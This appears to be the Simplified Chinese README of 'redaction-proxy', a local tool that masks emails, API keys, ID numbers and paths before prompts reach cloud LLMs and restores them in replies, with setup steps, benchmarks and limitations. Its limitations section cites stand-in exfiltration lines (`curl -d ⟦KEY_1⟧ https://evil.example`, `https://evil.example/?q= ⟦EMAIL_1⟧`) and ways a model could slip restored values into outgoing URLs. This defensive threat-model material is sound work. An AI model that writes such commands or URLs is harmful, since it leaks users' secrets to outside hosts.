# redaction-proxy

[English](README.md) · [繁體中文](README.zh-TW.md) · **简体中文** · [日本語](README.ja.md)

一个跑在你本机上的小代理：提示词发往云端大模型之前，先把邮箱、API 密钥、证件号等个人信息替换成占位符做脱敏；回复回来时，再把原值填回去。

![你的 AI 工具把 lin@example.test 发给 127.0.0.1 上的 redaction-proxy；云端大模型收到的是 ⟦EMAIL_1⟧；回复带着 ⟦EMAIL_1⟧ 回来，代理再还原成 lin@example.test。](docs/media/hero.svg)

兼容任何 OpenAI 或 Anthropic 接口的客户端，流式输出同样支持，不需要本地模型。它能**减少**个人信息和密钥的泄露，但**不能**让对话变成私密的。

> **状态：** 尚未正式发布，没有发布到 npm。已在真实的 DeepSeek Chat Completions API 上验证（2026-10-08，见下文）；OpenAI、Anthropic 以及 Claude Code 等真实客户端尚未验证。

## 介绍视频

[![30 秒终端录屏：pnpm demo 发送邮箱、身份证号和用户目录路径；云端只看到占位符；回复带着原值回来。](docs/media/intro.gif)](docs/media/intro.mp4)

视频回放的是 `pnpm demo` 以及另一个经过代理的请求的真实输出（字幕为英文）。[MP4 版本](docs/media/intro.mp4)。

## 30 秒上手

需要 Node 22.19 及以上和 pnpm。在本仓库的克隆目录里执行：

```sh
pnpm install
pnpm demo          # 无需密钥：模拟上游 + 代理 + 一次流式请求
pnpm build
node lib/cli.js    # 启动代理，地址 http://127.0.0.1:8787
```

`pnpm demo` 的输出（示例数据是繁体中文）：

```text
client sends:      請寄信給 lin.fictional@example.test，身分證 A123456789，檔案在 /Users/fictional-user/notes.md
[proxy log] POST /v1/chat/completions -> 200 masked 3 (EMAIL 1, TWID 1, PATH 1) restored 3 unknown 0 8ms
upstream received: 請寄信給 ⟦EMAIL_1⟧，身分證 ⟦TWID_1⟧，檔案在 ⟦PATH_1⟧/notes.md
client receives:   I will email lin.fictional@example.test about /Users/fictional-user/notes.md (ID A123456789).
```

### Docker

尚未实际构建或测试；编写这个镜像的环境没有 Docker。

```sh
docker build -t redaction-proxy .
export REDACTION_PROXY_AUTH_TOKEN=$(openssl rand -hex 32)
docker run --rm -p 127.0.0.1:8787:8787 -e REDACTION_PROXY_AUTH_TOKEN redaction-proxy
```

> **一定要用 `-p 127.0.0.1:8787:8787`，不要用 `-p 8787:8787`。** 镜像在容器内监听 `0.0.0.0`，所以没设 `REDACTION_PROXY_AUTH_TOKEN` 就拒绝启动，没带令牌的请求一律返回 401；唯一例外是允许来源的浏览器 CORS 预检，由代理自己应答，不转发任何内容（其他来源的网页得到 403）。令牌以明文 HTTP 传输；`127.0.0.1:` 这个前缀让它，以及你的工具经由代理发出的 API 密钥，不暴露在你的网络上。

客户端在 `x-redaction-proxy-token` 请求头中带上令牌：Claude Code 用 `ANTHROPIC_CUSTOM_HEADERS="x-redaction-proxy-token: $REDACTION_PROXY_AUTH_TOKEN"`；OpenAI 和 Anthropic SDK 用默认请求头选项（Python 的 `default_headers`、TypeScript 的 `defaultHeaders`）。

配置文件：加上 `-v "$PWD/redaction.json:/redaction.json:ro"`，并在末尾加 `--config /redaction.json`。人名模型：用 `--build-arg NAME_MODEL=1` 构建，并加上 `-v ~/models/nym:/models:ro -e REDACTION_PROXY_NAME_MODEL_DIR=/models`。

### npx（首次发布到 npm 之后）

目前还没有发布到 npm。发布之后：

```sh
npx redaction-proxy --demo
npx redaction-proxy           # 启动代理，地址 http://127.0.0.1:8787（本机不需要令牌）
```

## 接入你的工具

> **真实服务目前只验证了 DeepSeek。** 2026-10-08 用[真实服务验证脚本](e2e/real/README.md)对 DeepSeek 跑了 4 个场景（Chat Completions；普通与流式；纯文本与强制工具调用），全部通过：上游只看到占位符，每次 5 个值都正确还原。OpenAI、Anthropic 因没有密钥而跳过，也还没试过真实客户端。

工具照常发送自己的 API 密钥；代理原样转发，从不保存。

| 工具 | 配置 | 状态 |
| --- | --- | --- |
| Claude Code | `ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude` | 未测试 |
| Anthropic SDK | `ANTHROPIC_BASE_URL=http://127.0.0.1:8787`（不带 `/v1`） | 未测试 |
| OpenAI SDK 及大多数兼容工具 | `OPENAI_BASE_URL=http://127.0.0.1:8787/v1`（要带 `/v1`） | 未测试 |
| DeepSeek | 用 `REDACTION_PROXY_OPENAI_UPSTREAM=https://api.deepseek.com node lib/cli.js` 启动代理，再配 `OPENAI_BASE_URL=http://127.0.0.1:8787/v1` 和你的 DeepSeek 密钥。这会替换掉 OpenAI 上游。 | 已用真实服务验证脚本验证（仅 API） |
| Cursor | 不支持：Cursor 的自定义 base URL 请求从 Cursor 自己的服务器发出，访问不到你的 `127.0.0.1`。 | — |

<details><summary>curl 示例与配置文件</summary>

```sh
curl http://127.0.0.1:8787/v1/chat/completions \
  -H "authorization: Bearer $OPENAI_API_KEY" \
  -H "content-type: application/json" \
  -d '{"model":"gpt-4o-mini","messages":[{"role":"user","content":"给 lin@example.test 发封邮件"}]}'
```

用 `node lib/cli.js --config redaction.json` 指定 JSON 配置文件，环境变量可以覆盖它。上游 API 密钥永远不写进文件；出现不认识的键时启动失败。

| 键 | 默认值 | 说明 |
| --- | --- | --- |
| `port` | `8787` | TCP 端口。 |
| `host` | `127.0.0.1` | 监听地址。非本机地址（例如 Docker 中的 `0.0.0.0`）必须设置 `authToken`。 |
| `authToken` | 无 | 客户端必须在 `x-redaction-proxy-token` 请求头中发送的令牌，至少 16 个字符（`openssl rand -hex 32`）。监听本机时可不设。Claude Code 用 `ANTHROPIC_CUSTOM_HEADERS="x-redaction-proxy-token: <令牌>"` 发送；SDK 用其默认请求头选项。 |
| `allowedOrigins` | 无 | 除了本机 `http(s)` 网页之外，允许的浏览器或 Electron 来源，例如 `app://my-client`。不接受 `null`（`file://` 网页）。 |
| `openaiUpstream` | `https://api.openai.com` | Chat Completions 和 Responses 的上游。 |
| `anthropicUpstream` | `https://api.anthropic.com` | Anthropic Messages 的上游。 |
| `allowInsecureUpstream` | `false` | 允许以明文 `http://` 连接非本机的上游；API 密钥会以明文传输。 |
| `redaction.terms` | 无 | 需要脱敏的人名等词语，不区分大小写。 |
| `redaction.projectNames` | 无 | 需要脱敏的项目代号。 |
| `redaction.allowlist` | `git@github.com`、`noreply@github.com` | 永不脱敏的值。 |
| `redaction.rules` | 除 `card`、`entropy` 外全部 | 启用的内置规则。以 `card-strict`、`entropy-strict` 取代 `card`、`entropy`：不会把一串数字切成两半，也放过以文件名为键的哈希。 |
| `nameModel` | 无 | 开启[实验性的人名模型](#可选的人名模型实验性)。 |
| `screen` | `replace` | 遇到控制字符时替换成可见字符（`replace`）或拒绝请求（`refuse`）。 |
| `debugMasked` | `false` | 在日志里记录脱敏后的请求体。 |
| `toolRestore.categories` | `PATH`、`TERM`、`PROJECT` | 还原进工具调用参数的占位符类别；其他类别以占位符原样交给工具。`"*"` 还原所有类别。环境变量：`REDACTION_PROXY_TOOL_RESTORE_CATEGORIES`（逗号分隔）。 |
| `toolRestore.tools` | 无 | 按工具名（去掉首尾空白、不区分大小写）指定还原进该工具参数的类别，替换该工具的 `categories`，例如 `{"git_commit": ["PATH", "EMAIL"]}`；`"*"` 还原所有类别。 |

```json
{
  "redaction": {
    "terms": ["林小明", "Denise Whitlock"],
    "projectNames": ["Nimbus"]
  }
}
```

环境变量和全部选项见[技术细节第 12 节](docs/DETAILS.md#12-完整設定)（繁体中文）。日志每个请求一行，只有计数和耗时；工具调用参数中的每个占位符另记一行（还原或保留、id、工具、参数路径）。绝不包含原始值或请求头。

</details>

## 会脱敏哪些内容

![一个经过代理的真实请求：工具发送主机名、内网 IP、用户目录路径、API 密钥和邮箱；云端大模型收到 ⟦HOST_1⟧、⟦KEY_1⟧ 等占位符；回复带着原值回来。](docs/media/before-after.png)

| 类别 | 示例 | 云端看到 |
| --- | --- | --- |
| 邮箱 | `lin@example.test` | `⟦EMAIL_1⟧` |
| API 密钥和凭据 | `sk-…`、`ghp_…`、`AKIA…`、`glpat-…`、`sk_live_…`、JWT、`Bearer …`、`password=…`、`the token is …` | `⟦KEY_1⟧` |
| 用户目录路径（只遮前缀） | `/Users/lin/notes.md` | `⟦PATH_1⟧/notes.md` |
| 内网 IP、内部主机名 | `192.168.1.20`、`100.64.1.2`、`fd12::1`、`nas.local`、`git.corp` | `⟦IP_1⟧`、`⟦HOST_1⟧` |
| 各国国内格式或电话字眼后的电话号码 | `(415) 555-0132`、`020 7946 0958`、`Telefon: 030 12345678` | `⟦PHONE_1⟧` |
| 银行卡号（Luhn 校验） | 13–19 位 | `⟦CARD_1⟧` |
| 中国台湾身份证号、手机号、统一编号，以及关键词后的护照号与健保卡号 | `A123456789`、`0912-345-678`、`0912.345.678`、`護照 312345678` | `⟦TWID_1⟧`、`⟦PHONE_1⟧` |
| 另外 10 个国家和地区的证件号、IBAN | 中国大陆居民身份证号、美国 SSN、英国 NINO、日本个人编号等 | `⟦NATID_1⟧`、`⟦IBAN_1⟧` |
| 长随机串 | 32 位以上的 hex 或 base64 | `⟦ENTROPY_1⟧` |
| 你列出的词语 | `terms`、`projectNames` | `⟦TERM_1⟧`、`⟦PROJECT_1⟧` |

同一个值在整个请求里用同一个占位符。脱敏后如果请求里仍能找到检测到的值，代理会拒绝发送（422），不冒泄露的风险。客户端请求中绑定过、至少 6 个 ASCII 字符或 2 个其他字符长的值，代理按客户端凭证记在内存中，之后的请求即使历史中已没有检测它的上下文（`password: …`），也照样遮罩（凭证不区分 ASCII 大小写）。全角数字、`＠` 和零宽字符会先归一化再匹配。完整规则见[技术细节第 3 节](docs/DETAILS.md#3-偵測規則)。

## 可选的人名模型（实验性）

默认关闭。只靠规则识别不了人名。开启一个小型本地模型（[`Wismut/nym-pii-multilingual-small`](https://huggingface.co/Wismut/nym-pii-multilingual-small)，MIT 许可，108 MB）后，它会在**你**写的文字里额外脱敏人名、公司、地名和地址（`⟦NAME_1⟧`、`⟦ORG_1⟧`、`⟦LOC_1⟧`、`⟦ADDR_1⟧`）。

```sh
pnpm add -D onnxruntime-node@1.30.0 tokenizers@0.23.2   # 运行时，约 350 MB
node scripts/fetch-name-model.mjs ~/models/nym        # 约 125 MB，校验 sha256
REDACTION_PROXY_NAME_MODEL_DIR=$HOME/models/nym node lib/cli.js
```

它会漏掉一些人名，也会把一些不是人名的词遮掉。合成数据上的实测：

| | 结果 |
| --- | --- |
| 正文中的人名：英文、日文 | 召回率 1.00、1.00 |
| 粘贴的代码、日志、配置文件中的人名 | 模型不读取；在保留集第 2 版上，全部人名有 52% 被完整遮盖（英文 49%） |
| 正文中的人名：繁体中文 | 召回率 **0.87**（大约每 8 个漏 1 个） |
| 正文中的人名：简体中文 | 保留集 1.00，开发集 0.75（样本小，开发集只有 16 个人名） |
| 粘贴的代码、日志、JSON 中的人名 | 召回率 0.10–0.30：代码不读，这类人名请写进 `terms` |
| 精确率 | 0.94 |
| 代价 | 内存约 +420 MB；每 2 KB 中文正文 p95 约 130 ms |

它读哪些文字、全部数据和选项，见[技术细节第 16 节](docs/DETAILS.md#16-人名模型實驗性)。

## 实测结果

<!-- RESULTS:START -->
**held-out set v2 (written blind, run once)，保留集第 2 版（盲写、只跑一次）。** 7 种语言（英文、繁中、简中、日文、韩文、德文、法文）共 1,617 条合成提示词、10,268 个敏感值、2,997 个困难反例。编写者没看过规则和评测代码；约 60% 的值是非标准写法（用点分隔的卡号、小写 IBAN、`name at example dot com`、带分机的电话）。用 SHA-256 冻结后只评分一次，测量的是 commit `01489cd`；两版保留集及其哈希在 [bench/heldout/](bench/heldout/)。

![柱状图：英文保留集第 2 版提示词中各类别被完整脱敏的比例，代理默认规则、规则加人名模型与 Presidio（cutoff 0.4）对比。](docs/media/results.svg)

| 保留集第 2 版，英文提示词（1,527 个值） | 核心默认规则 | 代理默认规则 | + 人名模型（实验性） | Presidio，cutoff 0 | Presidio，cutoff 0.4 |
| --- | --- | --- | --- | --- | --- |
| 完整脱敏（10 类宏平均） | 25.9% | 39.5% | **44.8%** | 40.4% | 37.8% |
| 完全没遮（宏平均） | 64.0% | 49.9% | 35.6% | **29.3%** | 35.0% |
| 遮掉的区域确实是敏感值 | 94.3% | **95.8%** | 94.8% | 64.9% | 68.0% |
| 每条提示词的中位耗时 | 0.10 ms | 0.12 ms | 10.8 ms | 11.4 ms | 11.2 ms |
| 完整脱敏，全部 7 种语言 | 27.3% | 37.9% | 44.4% | 34.5%* | 32.8%* |

\* Presidio 把每条提示词都当英文分析，全部语言的结果仅供参考。

标准与非标准写法，英文，完整脱敏（n 为值的数量）：

| 类别 | 代理默认，标准 | 代理默认，非标准 | Presidio 0.4，标准 | Presidio 0.4，非标准 |
| --- | --- | --- | --- | --- |
| 邮箱 | 100%（n=107） | 61.5%（n=148） | 57.9% | 35.1% |
| 电话 | 70.4%（n=54） | 41.1%（n=107） | 83.3% | 85.0% |
| 身份证号 | 89.5%（n=19） | 30.4%（n=23） | 68.4% | 47.8% |
| 银行卡 | 94.7%（n=19） | 0.0%（n=40） | 84.2% | 15.0% |
| IBAN | 100%（n=15） | 0.0%（n=46） | 100% | 69.6% |
| 密钥 | 95.9%（n=49） | 80.7%（n=140） | 12.2% | 5.7% |
| 主机 | 100%（n=93） | 43.6%（n=149） | 47.3% | 12.1% |
| 人名（加人名模型） | 60.4%（n=164） | 39.1%（n=192） | 42.7% | 44.3% |

100% 的格子都是标准写法，正是规则针对的写法，而且样本小：n=15 全对只说明 15 个里没有漏掉任何一个。

薄弱之处（英文、代理默认）：

- **非标准写法**的 IBAN、卡号、身份证号大多识别不到（完整脱敏 0%、0%、30%）；38% 的非标准邮箱（`name at example dot com`、国际化域名、加空格）完全没有被遮。
- **路径**大多只遮掉一部分（88%）：用户名会被遮，路径其余部分保留。
- **地址。** 没有地址规则：完整脱敏 0%（人名模型遮掉一部分的有 77%）。
- **人名**要靠人名模型，完整脱敏 49%（全部语言 52%）。
- **电话**完整脱敏 51%（Presidio 85%）；带分机（`x204`）的电话没有一个被完整脱敏。

还原，自检而非成绩：只用规则时，1,617 条提示词脱敏后全部能逐字节还原；开启人名模型时是 1,617 条中的 1,587 条（30 条不完全一致）。

这次测量之后有三项修改，不包含在上面的数字中：代理默认现在也遮小写字母开头和夹不换行空格的中国台湾身份证号、用 `.`、`/`、`_` 分组或前 4 位加括号（`(0912)345678`）的手机号、关键词后的护照号与健保卡号、`@` 经 HTML 或 JSON 转义的邮箱、加引号的凭证键（`"密碼": "…"`、`"jwt": "…"`），以及 `100.64.0.0/10` 和 IPv6 唯一本地地址；`card-strict` 现在也能识别重新分组、用点分隔、混用空格和 `-`，以及换行断开的卡号（这次代理默认只完整脱敏 30.5% 的英文卡号，核心默认是 44.1%）；人名模型的还原错误已修正：同一个名字的不同写法（`Jordan`、`JORDAN`）现在各用一个占位符（自定义词汇也一样，`Nimbus` 和 `NIMBUS` 各自原样还原），2,908 条合成数据的还原检查从 754 条不一致降到 0 条。

完整表格：[保留集第 2 版结果](bench/results/public-bench-held-out-v2.md)。较早的[保留集第 1 版](bench/results/public-bench-held-out.md)（1,518 条、较旧的规则 `rules-6+intl-1`、只有标准写法）留作记录。方法和其他测量：[技术细节第 18 节](docs/DETAILS.md#18-實測數字)。
<!-- RESULTS:END -->

## 保护范围

- **保护什么：** 代理检测到的值，云端服务商一律收不到，只看到占位符。
- **不保护什么：** 值在你的电脑上还原之后，工具怎么使用它不在代理的范围内。检测器漏掉的内容原样发出，见[它防不了什么](#它防不了什么)和[完整限制清单](docs/DETAILS.md#17-完整限制清單)。
- **做不到什么：** 需要被遮值内容的任务，比如取出 email 的域名或转换一把密钥：模型只看到 `⟦EMAIL_1⟧`。
- **绝不能离开电脑的内容**应改由本地模型回答，比如通过把这类对话轮次留在本地的路由器（[dsh-privacy-router](https://github.com/PersonalAssistanceHsin/dsh-privacy-router)）。

## 它防不了什么

- **语义。** 云端仍能读到占位符周围的全部内容：`⟦PATH_1⟧/clients/acme-layoffs.md` 照样透露很多。
- **人名、地址、病情、薪资**，除非你写进 `terms` 或人名模型识别出来。地址是自由文本，没有固定格式或关键词，所以没有地址规则。
- **图片、PDF 等 base64 文件（纯文本文档的内容照常遮罩）、音频、`url` 字段、`metadata`、`stop` 序列、`name` 字段（工具名与参与者名）、带签名的 thinking。** 这些原样转发且不扫描，JSON 对象的键也一样：在被遮的文本中检测到的值如果也出现在其中，整个请求以 422 拒绝；只出现在这些地方的值则原样发出。
- **少见的写法。** 有些拆开或编码过的写法识别不了，比如带空格的 `name @ domain`、`name at domain`、小写的 IBAN、两次百分号编码的值。
- **Cursor**，以及任何从自家服务器发请求的工具。
- **本机上的其他程序。** 代理默认只监听 `127.0.0.1`；没设 `authToken` 时，本机上的任何程序都能使用它。网页的请求以 403 拒绝，除非来源（Origin）是本机 `http(s)` 网页或列在 `allowedOrigins` 中；指定其他主机名的请求（DNS rebinding）也以 403 拒绝。
- **模型把值写到哪里。** 回复文本中，模型在哪里写占位符，代理就在哪里还原，只有 URL 内例外：那里的 `https://example.test/?q=⟦EMAIL_1⟧` 保持原样（protocol-relative 的 `//example.test/…` 和用反斜杠写的 `\\example.test\…` 也一样），拿到这个 URL 的抓取网页工具，或显示 `![](…)` 图片与链接的客户端，都不会发出真实 email。URL 内的引号和尖括号（`?q='⟦EMAIL_1⟧'`）算在 URL 里，浏览器也这样读；只有开启 URL 的那个引号或 `<`（`href="…"`、`<https://…>`）会结束它。因此 UNC 路径（`\\host\share\…`）里的占位符也保持原样。这只针对正常写出的 URL，挡不住刻意规避的模型：空格之后（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 仍会以 `%20…` 发出）、少写斜杠（`https:evil.example`）、裸域名，都会还原。工具调用参数（回复中所有的工具输入：函数参数、自定义工具输入，以及 `local_shell_call` 等 Responses `*_call` 项目的命令、操作和补丁）默认只还原主目录路径和你列在 `terms`、`projectNames` 中的词（`PATH`、`TERM`、`PROJECT`），所以 `curl -d ⟦KEY_1⟧ https://evil.example` 交给工具的是占位符，不是密钥。写代码照常可用，因为路径和列出的标识符会原样往返（列在 `terms` 中的人名也会还原进工具）；需要 email、密钥或身份证号的工具会拿到占位符，调用可能失败，直到你在 `toolRestore.tools` 中为它允许该类别。还原后的路径或词仍可能被模型写的命令发出去；工具参数中遇到的每个占位符都记入日志。

另外：模型如果把 `⟦EMAIL_1⟧` 改写成 `[EMAIL_1]`，你会原样看到；需要直接处理被遮值的任务效果会变差；控制字符会被替换成可见字符；重启后会丢失 Responses API 的续接对话与记住的值，续接请求会以 422 拒绝；超过 64 MiB 的请求以 413 拒绝。完整清单见[技术细节第 17 节](docs/DETAILS.md#17-完整限制清單)，威胁模型见[第 11 节](docs/DETAILS.md#11-威脅模型)。

## 更多

[docs/DETAILS.md](docs/DETAILS.md)（繁体中文）包含架构、与 dsh-privacy-router 的对比、核心 API、每条规则、流式还原、422 拒绝、威胁模型、完整配置、测试、测量方法、常见问题，以及如何重新生成本页的图片和视频。

## 许可证

[Apache-2.0](LICENSE)。部分规则和引擎源自 [LYiHub/pub-dsh-privacy-router](https://github.com/LYiHub/pub-dsh-privacy-router)（MIT），见 [NOTICE](NOTICE)。
